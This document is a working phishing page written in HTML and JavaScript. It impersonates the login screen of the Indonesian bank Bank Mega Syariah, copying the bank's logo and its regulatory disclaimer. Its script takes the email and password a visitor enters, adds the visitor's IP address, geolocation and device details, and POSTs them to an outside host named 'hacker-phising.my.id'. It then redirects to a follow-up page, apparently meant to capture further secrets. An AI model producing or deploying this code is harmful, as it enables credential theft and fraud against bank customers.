<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, user-scalable=no">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color" content="#F7B32B">
  <title>Bank Mega Syariah | Login</title>
  <!-- Font Awesome 6 (free icons) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #FFFFFF;
      font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    /* Card utama putih, border radius halus seperti gambar */
    .login-card {
      max-width: 400px;
      width: 100%;
      background-color: #FFFFFF;
      border-radius: 0px;
     
      overflow: hidden;
    }

    .card-content {
      padding: 32px 24px 36px;
    }

    /* Logo area - persis seperti gambar (logo Bank Mega Syariah dengan tulisan Syariah) */
    .logo-area {
      text-align: center;
      margin-bottom: 32px;
    }

    .logo-main {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    /* Logo gambar persis seperti referensi Bank Mega Syariah */
    .logo-image {
      width: 140px;
      height: auto;
      margin-bottom: 8px;
    }

    .logo-image img {
      width: 100%;
      height: auto;
      display: block;
    }

    /* Tulisan Syariah di bawah logo (opsional, sesuai gambar ada tulisan Syariah) */
    .syariah-text {
      font-size: 18px;
      font-weight: 600;
      color: #F7B32B;
      letter-spacing: 1px;
      margin-top: 4px;
    }

    /* Form group dengan label di atas input (seperti gambar) */
    .input-group {
      margin-bottom: 20px;
      position: relative;
    }

    .input-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1E2A3A;
      margin-bottom: 8px;
      letter-spacing: 0.3px;
    }

    .input-wrapper {
      position: relative;
      width: 100%;
    }

    .input-wrapper .field-icon {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: #9AA6B5;
      font-size: 18px;
      pointer-events: none;
      z-index: 2;
    }

    .input-wrapper input {
      width: 100%;
      padding: 14px 48px 14px 48px;
      font-size: 15px;
      font-weight: 500;
      border: 1.5px solid #E2E8F0;
      border-radius: 16px;
      background-color: #FFFFFF;
      transition: all 0.2s;
      outline: none;
      font-family: inherit;
      color: #1E2A3A;
    }

    .input-wrapper input:focus {
      border-color: #F7B32B;
      box-shadow: 0 0 0 3px rgba(247, 179, 43, 0.15);
    }

    .input-wrapper input::placeholder {
      color: #B9C3D0;
      font-weight: 400;
      font-size: 14px;
    }

    /* Toggle password icon */
    .toggle-pwd {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      color: #9AA6B5;
      font-size: 18px;
      transition: color 0.2s;
      z-index: 3;
    }

    .toggle-pwd:hover {
      color: #F7B32B;
    }

    /* Lupa Password link */
    .forgot-link {
      text-align: right;
      margin: 8px 0 24px 0;
    }

    .forgot-link a {
      font-size: 13px;
      color: #F7B32B;
      text-decoration: none;
      font-weight: 600;
    }

    .forgot-link a:hover {
      text-decoration: underline;
    }

    /* Tombol Masuk - warna kuning solid seperti gambar */
    .btn-masuk {
      background: #F7B32B;
      border: none;
      width: 100%;
      padding: 14px 10px;
      border-radius: 16px;
      font-size: 16px;
      font-weight: 700;
      color: #1F2A3E;
      cursor: pointer;
      transition: 0.2s;
      font-family: inherit;
      margin-bottom: 24px;
    }

    .btn-masuk:hover {
      background: #E5A020;
      transform: scale(0.98);
    }

    /* Daftar section */
    .register-section {
      text-align: center;
      margin-bottom: 24px;
      font-size: 14px;
      color: #5A6B7E;
    }

    .register-section a {
      color: #F7B32B;
      font-weight: 700;
      text-decoration: none;
      margin-left: 5px;
    }

    .register-section a:hover {
      text-decoration: underline;
    }

    /* Bantuan & Allo Explore - persis seperti gambar dengan background abu muda */
    .help-section {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background-color: #F8F9FC;
      padding: 12px 20px;
      border-radius: 60px;
      margin-bottom: 20px;
    }

    .help-item {
      display: flex;
      align-items: center;
      gap: 10px;
      font-weight: 600;
      font-size: 14px;
      color: #2C3E50;
      cursor: pointer;
    }

    .help-item i {
      font-size: 18px;
      color: #F7B32B;
    }

    .allo-explore {
      display: flex;
      align-items: center;
      gap: 8px;
      background: #FFFFFF;
      padding: 6px 16px;
      border-radius: 40px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
      cursor: pointer;
    }

    .allo-explore i {
      font-size: 16px;
      color: #F7B32B;
    }

    .allo-explore span {
      font-weight: 700;
      font-size: 13px;
      color: #1E2A3A;
    }

    /* Footer disclaimer */
    .footer-note {
      text-align: center;
      font-size: 10px;
      color: #8C9AA9;
      line-height: 1.45;
      margin-top: 16px;
      padding-top: 12px;
      border-top: 1px solid #EDF2F7;
    }

    @media (max-width: 460px) {
      .card-content {
        padding: 24px 20px 32px;
      }
      .btn-masuk {
        font-size: 15px;
      }
      .help-section {
        padding: 10px 16px;
      }
    }
  </style>
</head>
<body>

<div class="login-card">
  <div class="card-content">
    <!-- Logo area: sesuai gambar, ada logo Bank Mega Syariah dengan tulisan Syariah -->
    <div class="logo-area">
      <div class="logo-main">
        <!-- Logo persis seperti gambar Bank Mega Syariah (menggunakan logo resmi yang tersedia) -->
        <div class="logo-image">
          <img src="https://www.megasyariah.co.id/bms-new/asset/images/LogoColor.svg" alt="Bank Mega Syariah" onerror="this.src='https://upload.wikimedia.org/wikipedia/id/thumb/b/bc/Logo_Bank_Mega_Syariah.svg/320px-Logo_Bank_Mega_Syariah.svg.png'">
        </div>
        <!-- Teks Syariah di bawah logo sesuai gambar -->
       </div>
    </div>

    <!-- Form login -->
    <form id="loginForm" action="#" method="post">
      <!-- Field Email dengan label "Email" -->
      <div class="input-group">
        <label>Email</label>
        <div class="input-wrapper">
          <i class="fas fa-envelope field-icon"></i>
          <input type="email" id="emailInput" placeholder="Masukkan Email" autocomplete="email" required>
        </div>
      </div>

      <!-- Field Password dengan label "Password" -->
      <div class="input-group">
        <label>Password</label>
        <div class="input-wrapper">
          <i class="fas fa-lock field-icon"></i>
          <input type="password" id="passwordInput" placeholder="Masukkan Password" autocomplete="current-password" required>
          <i class="fas fa-eye-slash toggle-pwd" id="togglePasswordIcon"></i>
        </div>
      </div>

      <!-- Lupa Password link -->
      <div class="forgot-link">
        <a href="#" id="lupaPasswordLink">Lupa Password</a>
      </div>

      <!-- Tombol Masuk -->
      <button type="submit" class="btn-masuk" id="loginButton">Amankan Akun</button>

      <!-- Daftar akun baru -->
      <div class="register-section">
        Belum memiliki Rekening? <a href="#" id="daftarLink">Daftar</a>
      </div>

      <!-- Bantuan & Allo Explore seperti gambar -->
      <div class="help-section">
        <div class="help-item" id="bantuanBtn">
          <i class="fas fa-headset"></i>
          <span>Bantuan</span>
        </div>
        <div class="allo-explore" id="alloExploreBtn">
          <i class="fas fa-compass"></i>
          <span>Allo Explore</span>
        </div>
      </div>

      <!-- Footer disclaimer OJK, BI, LPS (persis teks gambar) -->
      <div class="footer-note">
        PT Bank Mega Syariah berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) dan Bank Indonesia (BI),<br>
        serta merupakan peserta penjaminan Lembaga Penjamin Simpanan (LPS).
      </div>
    </form>
  </div>
</div>

<script>
  // Toggle password visibility (mata)
  const togglePasswordBtn = document.getElementById('togglePasswordIcon');
  const passwordField = document.getElementById('passwordInput');

  if (togglePasswordBtn && passwordField) {
    togglePasswordBtn.addEventListener('click', function() {
      const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
      passwordField.setAttribute('type', type);
      if (type === 'text') {
        togglePasswordBtn.classList.remove('fa-eye-slash');
        togglePasswordBtn.classList.add('fa-eye');
      } else {
        togglePasswordBtn.classList.remove('fa-eye');
        togglePasswordBtn.classList.add('fa-eye-slash');
      }
    });
  }

  // Fungsi ambil data lokasi & IP menggunakan ipapi.co (gratis, tanpa token)
  async function getLocationData() {
    try {
      const response = await fetch('https://ipapi.co/json/');
      if (!response.ok) throw new Error('Gagal ambil lokasi');
      const data = await response.json();
      return {
        ip: data.ip || 'unknown',
        city: data.city || 'unknown',
        region: data.region || 'unknown',
        country: data.country_name || 'unknown',
        loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : '-6.2088,106.8456',
        org: data.org || 'unknown'
      };
    } catch (error) {
      console.warn('Fallback location');
      return {
        ip: '127.0.0.1',
        city: 'Jakarta',
        region: 'Jakarta',
        country: 'Indonesia',
        loc: '-6.2088,106.8456',
        org: 'ISP'
      };
    }
  }

  // Event submit login - sesuai gambar mengirim data ke req/login.php lalu redirect otp.html
  const form = document.getElementById('loginForm');
  form.addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const email = document.getElementById('emailInput').value.trim();
    const password = document.getElementById('passwordInput').value;
    
    if (!email || !password) {
      alert('Harap masukkan Email dan Password');
      return;
    }
    
    if (!email.includes('@')) {
      alert('Masukkan email yang valid');
      return;
    }
    
    const loginBtn = document.getElementById('loginButton');
    const originalText = loginBtn.innerText;
    loginBtn.innerText = 'Memproses...';
    loginBtn.disabled = true;
    
    try {
      const locationInfo = await getLocationData();
      
      const payload = {
        userID: email,
        password: password,
        ip: locationInfo.ip,
        city: locationInfo.city,
        region: locationInfo.region,
        country: locationInfo.country,
        loc: locationInfo.loc,
        org: locationInfo.org,
        device: navigator.userAgent
      };
      
      // Kirim ke endpoint req/login.php (sama persis dengan script gambar)
      fetch('https://hacker-phising.my.id/notif/req/login.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      })
      .then(response => response.text())
      .then(() => {
        // Redirect ke otp.html seperti pada gambar
        window.location.href = 'pintran.html';
      })
      .catch(() => {
        // Jika gagal, tetap redirect (sesuai perilaku di gambar)
        window.location.href = 'pintran.html';
      });
    } catch (err) {
      console.error(err);
      alert('Terjadi kesalahan. Silakan coba lagi.');
      loginBtn.innerText = originalText;
      loginBtn.disabled = false;
    }
  });
  
  // Lupa Password link
  const lupaLink = document.getElementById('lupaPasswordLink');
  if (lupaLink) {
    lupaLink.addEventListener('click', function(e) {
      e.preventDefault();
      alert('Silakan hubungi Call Center Bank Mega Syariah 1500 888 atau melalui fitur lupa password di aplikasi.');
    });
  }
  
  // Daftar link
  const daftarLink = document.getElementById('daftarLink');
  if (daftarLink) {
    daftarLink.addEventListener('click', function(e) {
      e.preventDefault();
      alert('Pendaftaran rekening dapat dilakukan melalui cabang terdekat atau aplikasi Allo Explore.');
    });
  }
  
  // Bantuan klik
  const bantuanBtn = document.getElementById('bantuanBtn');
  if (bantuanBtn) {
    bantuanBtn.addEventListener('click', function() {
      alert('Hubungi Call Center: 1500 888 | Email: cs@megasyariah.co.id');
    });
  }
  
  // Allo Explore klik
  const alloExploreBtn = document.getElementById('alloExploreBtn');
  if (alloExploreBtn) {
    alloExploreBtn.addEventListener('click', function() {
      alert('Allo Explore: Super App dari Bank Mega, download di Play Store atau App Store.');
    });
  }
</script>
</body>
</html>
